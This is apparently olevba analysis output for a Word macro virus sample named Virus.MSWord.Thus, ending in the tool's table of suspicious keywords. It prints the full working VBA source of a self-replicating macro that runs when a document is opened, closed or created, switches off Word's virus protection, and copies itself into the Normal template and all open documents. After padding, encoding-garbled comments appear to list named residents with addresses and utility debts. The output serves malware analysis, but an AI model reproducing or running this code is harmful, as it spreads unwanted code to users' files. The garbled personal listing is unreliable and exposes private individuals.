olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-245720f9317b75faa661df9c82354ac399c5d71c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-245720f9317b75faa661df9c82354ac399c5d71c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
'Anti-Smyser'
' This virus is an alteration of a virus which was
' designed to delete all files from one's C: drive on Dec 13th.
' This code is completely benign.
    On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    
    For k = 1 To Application.Documents.Count
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "'Anti-Smyser'" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
            .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        End If
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
            .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
            .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
            .VBComponents.Item(1).CodeModule.CountOfLines)
        End If
    Next k
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub














































































                                                                                                                      '       ƒËÂÍÚÓÛ ÀÃœ“—
                                                                                                        '–ÂÁÌËÍÓ‚Û ¿.».

                                                                                                                                                                                                                                                       '˛ËÒÍÓÌÒÛÎ¸Ú‡
                                                                                                        '—ÂÏËÚÓˆÍÓ„Ó  .Õ.





'—ÎÛÊÂ·Ì‡ˇ Á‡ÔËÒÍ‡



'œÓ¯Û ¬‡Ò ÔÂÂ˜ËÒÎËÚ¸ „ÓÒÔÓ¯ÎËÌÛ, ÌÂÓ·ıÓ‰ËÏÛ˛ ‰Îˇ Ó·‡˘ÂÌËˇ ‚ ÒÛ‰ ÔÓ ‰ÂÎ‡Ï Ó ÔËÌÛ‰ËÚÂÎ¸ÌÓÏ ‚Á˚ÒÍ‡ÌËË Á‡‰ÓÎÊÂÌÌÓÒÚË Á‡ ÔÓÎ¸ÁÓ‚‡ÌËÂ ÛÒÎÛ„‡ÏË ÔÓ „Óˇ˜ÂÏÛ ‚Ó‰ÓÒÌ‡·ÊÂÌË˛ Ë ˆÂÌÚ‡Î¸ÌÓÏÛ ÓÚÓÔÎÂÌË˛ ÒÓ ÒÎÂ‰Û˛˘Ëı ÎËˆ:

'π           ‘.».Œ.                     ¿‰ÂÒ    —ÛÏÏ‡ ‰ÓÎ„‡     √ÓÒÔÓ¯ÎËÌ‡ ‚ ÒÓÓÚ‚ÂÚÒÚ‚ËË Ò Ô. 2 ÒÚ.3  ƒÂÍÂÚ‡  ‡·ËÌÂÚ‡ ÃËÌËÒÚÓ‚ ”Í.
'1.   œÓ‰ÌÂ·ÂÒÌÓ„Ó »‚‡Ì‡ »‚‡ÌÓ‚Ë˜‡   1-12-12 1727,52„Ì.     51,0„Ì.
'2.    ÓÏËÒ‡ÂÌÍÓ ¿ÎÂÍÒÂˇ ÃÓËÒÂÂ‚Ë˜‡ 1-12-14        1811,44„Ì.      51,0„Ì.'

'3.   ﬂÌÍÂ‚Ë˜‡ »„Óˇ ¬Î‡‰ËÏËÓ‚Ë˜‡   1-5-49       1370,09„Ì.        51,0„Ì.
'4.   ÀÂÒÌË˜Â„Ó »‚‡Ì‡ »Î¸Ë˜‡ 1-4-29       1704,41„Ì.        51,0„Ì.
'5.   —ÓÍÓÎÓ‚ÒÍÓ„Ó ¬Î‡‰ËÏË‡ ¿ÎÂÍÒÂÂ‚Ë˜‡ 1-9-37  1593,23„Ì.     51,00„Ì.
'6.  —ÓÁÌ‡¯ÎËÎË À˛‰ÏËÎ‡ ‘Â‰ÓÓ‚Ì‡    1-19-53 1634,89„Ì.    51,00„Ì.
'7.  “ÓÎÒÚËÍ ¬‡ÒË‰Ëˇ ¿ÎÂÍÒ‡Ì‰Ó‚Ë˜‡  1-11-73 1744,34„Ì.    51,00„Ì.
'8.  œÂÚÂÌÍÓ À˛‰ÏËÎ˚ ¿Ì‡ÚÓÎ¸Â‚Ì˚      1-12-24   1232,68„Ì.    51,00„Ì.
'9.  «ËÌ˜ÂÌÍÓ ¬‡ÎÂÌÚËÌ˚ ÕËÍÓÎ‡Â‚Ì˚   1-12-35 2433,69„Ì.    51,0„Ì.

'10. ¡ÓÌ‰‡ÂÌÍÓ ﬁÎËË ‘Â‰ÓÓ‚Ì˚   1-16-18 1730,78„Ì.    51,0„Ì.
'11. ¡ÂÎÓ„Ó ¿ÎÂÍÒ‡Ì‰‡ »‚‡ÌÓ‚Ë˜‡ 1-16-70 1413,38„Ì.    51,0„Ì.
'12. ’ÓÏÂÌÍÓ ¿ÌÌ˚ √Ë„Ó¸Â‚Ì˚    1-15-53 1756,82„Ì.    51,0„Ì
'13. ÀÂ‚ËˆÍÓ„Ó —Â„Â˛ –ÓÏ‡ÌÓ‚Ë˜‡ 1-23-7  1231,69„Ì.    51,0„Ì.
'14. ÀËÚ‚ËÌÂÌÍÓ ÀË‰ËË ÃËı‡ÈÎÓ‚Ì˚ 1-23-1  1364,83„Ì.    51,0„Ì.
'15. Õ‡„ÂÎ¸ ÕËÌ˚ —Â„ÂÂ‚Ì˚   3-33‡-32    1927,08„Ì.    51,0„Ì.
'16. ¡‡Î‰ËÌÓÈ —‚ÂÚÎ‡Ì˚ ¬‡ÒËÎ¸Â‚Ì˚    2-4-16  1164,15„Ì.    51,0„Ì.
'17. —Ë‚ÓÍÓ·˚Î¸ÒÍÓÈ √‡ÎËÌ˚ ÀÂÓÌË‰Ó‚Ì˚    1-23-14 1564,29„Ì.    51,0„Ì.
'18.  ‡ÔÎÛÌ ƒËˇ ¬‡ÒËÎ¸Â‚Ë˜‡ 3-36-28 681,36„Ì.     51,0„Ì.
'19. —ÎÂÚ‡ ƒËˇ ¿ÎÂÍÒ‡Ì‰Ó‚Ë˜‡   5-12-45 1432,56„Ì.    51,0„Ì.

'


 'ﬁËÒÍÓÌÒÛÎ¸Ú  .Õ.—ÂÏËÚÓˆÍËÈ




























































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

